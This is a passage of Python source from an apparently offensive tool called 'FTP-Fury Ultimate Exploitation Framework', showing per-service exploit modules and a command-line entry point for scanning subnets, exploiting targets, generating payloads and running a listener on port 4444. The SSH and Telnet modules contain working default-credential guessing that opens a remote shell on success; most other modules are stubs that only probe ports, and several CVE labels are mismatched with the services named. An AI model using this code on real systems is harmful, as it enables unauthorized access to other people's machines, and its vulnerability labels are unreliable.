    def __init__(self):
        super().__init__("ssh", "CVE-2018-15473", "SSH User Enumeration")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, 22))
            banner = s.recv(1024).decode()
            s.close()
            return "SSH" in banner
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            if PARAMIKO_AVAILABLE:
                common_creds = [
                    ('root', 'root'), ('root', 'toor'), ('root', 'password'),
                    ('admin', 'admin'), ('admin', 'password'), ('user', 'user')
                ]
                
                for user, password in common_creds:
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(target, username=user, password=password, timeout=5)
                        
                        transport = ssh.get_transport()
                        channel = transport.open_session()
                        channel.get_pty()
                        channel.invoke_shell()
                        self.success_count += 1
                        return AdvancedShellSession(channel, target, user, "ssh")
                    except:
                        continue
            return None
        except:
            return None

class RDPModule(ExploitModule):
    def __init__(self):
        super().__init__("rdp", "CVE-2019-0708", "BlueKeep RDP RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, 3389))
            s.close()
            return True
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] RDP on {target}")
            return None
        except:
            return None

class TelnetModule(ExploitModule):
    def __init__(self):
        super().__init__("telnet", "CVE-2011-4862", "Telnet RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, 23))
            s.recv(1024)
            s.close()
            return True
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            creds = [('root', ''), ('admin', ''), ('user', ''), ('root', 'root')]
            for user, password in creds:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    s.connect((target, 23))
                    s.recv(1024)
                    s.send(f"{user}\r\n".encode())
                    s.recv(1024)
                    s.send(f"{password}\r\n".encode())
                    time.sleep(1)
                    data = s.recv(1024)
                    if b"login" in data or b"Password" in data:
                        continue
                    self.success_count += 1
                    return AdvancedShellSession(s, target, user, "telnet")
                except:
                    continue
            return None
        except:
            return None

class SNMPModule(ExploitModule):
    def __init__(self):
        super().__init__("snmp", "CVE-2002-0013", "SNMP RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, 161))
            s.close()
            return True
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] SNMP on {target}")
            return None
        except Exception as e:
            logger.error(f"SNMP exploit failed: {e}")
            return None

class DNSModule(ExploitModule):
    def __init__(self):
        super().__init__("dns", "CVE-2015-7547", "DNS RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, 53))
            s.close()
            return True
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] DNS on {target}")
            return None
        except Exception as e:
            logger.error(f"DNS exploit failed: {e}")
            return None

class DHCPModule(ExploitModule):
    def __init__(self):
        super().__init__("dhcp", "CVE-2019-0547", "DHCP RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, 67))
            s.close()
            return True
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] DHCP on {target}")
            return None
        except Exception as e:
            logger.error(f"DHCP exploit failed: {e}")
            return None

class NTPModule(ExploitModule):
    def __init__(self):
        super().__init__("ntp", "CVE-2014-9295", "NTP RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, 123))
            s.close()
            return True
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] NTP on {target}")
            return None
        except Exception as e:
            logger.error(f"NTP exploit failed: {e}")
            return None

class LDAPModule(ExploitModule):
    def __init__(self):
        super().__init__("ldap", "CVE-2016-0728", "LDAP RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, 389))
            s.close()
            return True
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] LDAP on {target}")
            return None
        except Exception as e:
            logger.error(f"LDAP exploit failed: {e}")
            return None

class KerberosModule(ExploitModule):
    def __init__(self):
        super().__init__("kerberos", "CVE-2014-0144", "Kerberos RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, 88))
            s.close()
            return True
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] Kerberos on {target}")
            return None
        except Exception as e:
            logger.error(f"Kerberos exploit failed: {e}")
            return None

class NFSModule(ExploitModule):
    def __init__(self):
        super().__init__("nfs", "CVE-2014-8071", "NFS RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, 2049))
            s.close()
            return True
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] NFS on {target}")
            return None
        except Exception as e:
            logger.error(f"NFS exploit failed: {e}")
            return None

class FTPModule(ExploitModule):
    def __init__(self):
        super().__init__("ftp", "CVE-2015-3306", "ProFTPD RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, 21))
            banner = s.recv(1024).decode()
            s.close()
            return "ProFTPD" in banner or "vsFTPd" in banner
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] FTP on {target}")
            return None
        except Exception as e:
            logger.error(f"FTP exploit failed: {e}")
            return None

class HTTPModule(ExploitModule):
    def __init__(self):
        super().__init__("http", "CVE-2017-9791", "Apache Struts RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            resp = requests.get(f"http://{target}", timeout=3)
            return resp.status_code == 200
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] HTTP on {target}")
            return None
        except Exception as e:
            logger.error(f"HTTP exploit failed: {e}")
            return None

class HTTPSModule(ExploitModule):
    def __init__(self):
        super().__init__("https", "CVE-2014-3566", "POODLE SSL")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            resp = requests.get(f"https://{target}", timeout=3, verify=False)
            return resp.status_code == 200
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] HTTPS on {target}")
            return None
        except Exception as e:
            logger.error(f"HTTPS exploit failed: {e}")
            return None

class ApacheModule(ExploitModule):
    def __init__(self):
        super().__init__("apache", "CVE-2017-9798", "Apache RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            resp = requests.get(f"http://{target}", timeout=3)
            return "Apache" in resp.headers.get('Server', '')
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] Apache on {target}")
            return None
        except Exception as e:
            logger.error(f"Apache exploit failed: {e}")
            return None

class NginxModule(ExploitModule):
    def __init__(self):
        super().__init__("nginx", "CVE-2019-11043", "Nginx RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            resp = requests.get(f"http://{target}", timeout=3)
            return "nginx" in resp.headers.get('Server', '').lower()
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] Nginx on {target}")
            return None
        except Exception as e:
            logger.error(f"Nginx exploit failed: {e}")
            return None

class IISModule(ExploitModule):
    def __init__(self):
        super().__init__("iis", "CVE-2017-7269", "IIS RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            resp = requests.get(f"http://{target}", timeout=3)
            return "Microsoft-IIS" in resp.headers.get('Server', '')
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] IIS on {target}")
            return None
        except Exception as e:
            logger.error(f"IIS exploit failed: {e}")
            return None

class WebLogicModule(ExploitModule):
    def __init__(self):
        super().__init__("weblogic", "CVE-2020-2551", "WebLogic RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            resp = requests.get(f"http://{target}:7001", timeout=3)
            return "WebLogic" in resp.text
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] WebLogic on {target}")
            return None
        except Exception as e:
            logger.error(f"WebLogic exploit failed: {e}")
            return None

class WebSphereModule(ExploitModule):
    def __init__(self):
        super().__init__("websphere", "CVE-2019-4473", "WebSphere RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            resp = requests.get(f"http://{target}:9060", timeout=3)
            return "WebSphere" in resp.text
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] WebSphere on {target}")
            return None
        except Exception as e:
            logger.error(f"WebSphere exploit failed: {e}")
            return None

class GlassFishModule(ExploitModule):
    def __init__(self):
        super().__init__("glassfish", "CVE-2019-10853", "GlassFish RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            resp = requests.get(f"http://{target}:4848", timeout=3)
            return "GlassFish" in resp.text
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] GlassFish on {target}")
            return None
        except Exception as e:
            logger.error(f"GlassFish exploit failed: {e}")
            return None

class JBossModule(ExploitModule):
    def __init__(self):
        super().__init__("jboss", "CVE-2010-0738", "JBoss RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            resp = requests.get(f"http://{target}:8080", timeout=3)
            return "JBoss" in resp.text
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] JBoss on {target}")
            return None
        except Exception as e:
            logger.error(f"JBoss exploit failed: {e}")
            return None

class WildFlyModule(ExploitModule):
    def __init__(self):
        super().__init__("wildfly", "CVE-2019-3874", "WildFly RCE")
    
    def detect(self, target: str) -> bool:
        self.detection_count += 1
        try:
            resp = requests.get(f"http://{target}:8080", timeout=3)
            return "WildFly" in resp.text
        except:
            return False
    
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        self.exploit_count += 1
        try:
            logger.info(f"[*] WildFly on {target}")
            return None
        except Exception as e:
            logger.error(f"WildFly exploit failed: {e}")
            return None

# ============================================================
# MAIN ENTRY POINT
# ============================================================

def main():
    parser = argparse.ArgumentParser(
        description='FTP-Fury Ultimate Exploitation Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Author: SYLHETYHACKVENGER (THE-ERROR808)
Version: ULTIMATE EDITION

Examples:
  python ftp-fury.py --scan 192.168.1.0/24
  python ftp-fury.py --exploit 192.168.1.10
  python ftp-fury.py --web
  python ftp-fury.py --list-modules
  python ftp-fury.py --generate-payload linux
        """
    )
    parser.add_argument('target', nargs='?', help='Target IP address')
    parser.add_argument('-m', '--module', help='Specific module to use')
    parser.add_argument('-s', '--scan', help='Scan network subnet')
    parser.add_argument('--aggressive', action='store_true', help='Aggressive scanning and exploitation')
    parser.add_argument('--web', action='store_true', help='Start web panel')
    parser.add_argument('--listen-ip', default='0.0.0.0', help='Listener IP')
    parser.add_argument('--listen-port', type=int, default=4444, help='Listener port')
    parser.add_argument('--web-port', type=int, default=5000, help='Web panel port')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--list-modules', action='store_true', help='List available modules')
    parser.add_argument('--generate-payload', choices=['linux', 'windows'], help='Generate payload')
    
    args = parser.parse_args()
    
    if args.list_modules:
        print(f"{Color.CYAN}Available Modules:{Color.RESET}")
        modules = [
            ("vsftpd", "CVE-2011-2523", "vsFTPd 2.3.4 Backdoor"),
            ("shellshock", "CVE-2014-6271", "Bash Shellshock RCE"),
            ("log4shell", "CVE-2021-44228", "Log4J JNDI RCE"),
            ("cisco_ise", "CVE-2025-20337", "Cisco ISE Unauthenticated RCE"),
            ("cacti", "CVE-2024-25641", "Cacti RCE"),
            ("eternalblue", "CVE-2017-0144", "EternalBlue SMB RCE"),
            ("struts2", "CVE-2017-5638", "Apache Struts2 RCE"),
            ("jenkins", "CVE-2017-1000353", "Jenkins RCE"),
            ("redis", "CVE-2015-8080", "Redis RCE"),
            ("tomcat", "CVE-2017-12615", "Tomcat RCE"),
            ("heartbleed", "CVE-2014-0160", "OpenSSL Heartbleed"),
            ("drupal", "CVE-2018-7600", "Drupal RCE"),
            ("wordpress", "CVE-2019-8942", "WordPress RCE"),
            ("joomla", "CVE-2015-8562", "Joomla RCE"),
            ("mysql", "CVE-2012-2122", "MySQL Authentication Bypass"),
            ("postgresql", "CVE-2019-9193", "PostgreSQL RCE"),
            ("mssql", "CVE-2019-9193", "MSSQL RCE"),
            ("smb", "CVE-2020-0796", "SMBGhost"),
            ("ssh", "CVE-2018-15473", "SSH User Enumeration"),
            ("rdp", "CVE-2019-0708", "BlueKeep RDP RCE"),
            ("telnet", "CVE-2011-4862", "Telnet RCE"),
            ("snmp", "CVE-2002-0013", "SNMP RCE"),
            ("dns", "CVE-2015-7547", "DNS RCE"),
            ("dhcp", "CVE-2019-0547", "DHCP RCE"),
            ("ntp", "CVE-2014-9295", "NTP RCE"),
            ("ftp", "CVE-2015-3306", "ProFTPD RCE"),
            ("http", "CVE-2017-9791", "Apache Struts RCE"),
            ("https", "CVE-2014-3566", "POODLE SSL"),
            ("ldap", "CVE-2016-0728", "LDAP RCE"),
            ("kerberos", "CVE-2014-0144", "Kerberos RCE"),
            ("nfs", "CVE-2014-8071", "NFS RCE"),
            ("apache", "CVE-2017-9798", "Apache RCE"),
            ("nginx", "CVE-2019-11043", "Nginx RCE"),
            ("iis", "CVE-2017-7269", "IIS RCE"),
            ("weblogic", "CVE-2020-2551", "WebLogic RCE"),
            ("websphere", "CVE-2019-4473", "WebSphere RCE"),
            ("glassfish", "CVE-2019-10853", "GlassFish RCE"),
            ("jboss", "CVE-2010-0738", "JBoss RCE"),
            ("wildfly", "CVE-2019-3874", "WildFly RCE")
        ]
        for name, cve, desc in modules:
            print(f"  {name:<15} {cve:<18} {desc}")
        sys.exit(0)
    
    if args.generate_payload:
        framework = ExploitFramework()
        framework._generate_payload(args.generate_payload)
        sys.exit(0)
    
    # Update config
    CONFIG['listen_ip'] = args.listen_ip
    CONFIG['listen_port'] = args.listen_port
    CONFIG['web_port'] = args.web_port
    CONFIG['debug'] = args.verbose
    
    # Initialize framework
    framework = ExploitFramework()
    
    # Start web panel if requested
    if args.web:
        framework.start_web_panel()
        print(f"{Color.GREEN}[+] Web panel running at http://{CONFIG['listen_ip']}:{CONFIG['web_port']}{Color.RESET}")
        print(f"{Color.DIM}[+] Press Ctrl+C to stop{Color.RESET}")
        try:
            while framework.running:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
        framework.cleanup()
        sys.exit(0)
    
    # Handle command line arguments
    if args.scan:
        targets = framework.scan_network(args.scan, aggressive=args.aggressive)
        print(f"{Color.GREEN}[+] Found {len(targets)} targets{Color.RESET}")
        for t in targets[:20]:
            print(f"  {Color.GREEN}✓{Color.RESET} {t.ip} - {', '.join(t.services.values())}")
            if t.vulnerabilities:
                print(f"    {Color.RED}Vulnerable: {', '.join(t.vulnerabilities[:3])}{Color.RESET}")
        if len(targets) > 20:
            print(f"{Color.DIM}[+] ... and {len(targets)-20} more{Color.RESET}")
    
    if args.target:
        if args.module:
            session = framework.exploit_target(args.target, args.module)
        else:
            session = framework.exploit_target(args.target)
        
        if session:
            session.interactive_mode()
        else:
            print(f"{Color.RED}[!] Exploit failed{Color.RESET}")
    
    if not args.target and not args.scan and not args.web:
        # Start interactive mode - banner will be printed inside
        framework.interactive_mode()
    
    # Cleanup
    framework.cleanup()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Color.YELLOW}[!] Interrupted by user{Color.RESET}")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        traceback.print_exc()
        sys.exit(1)
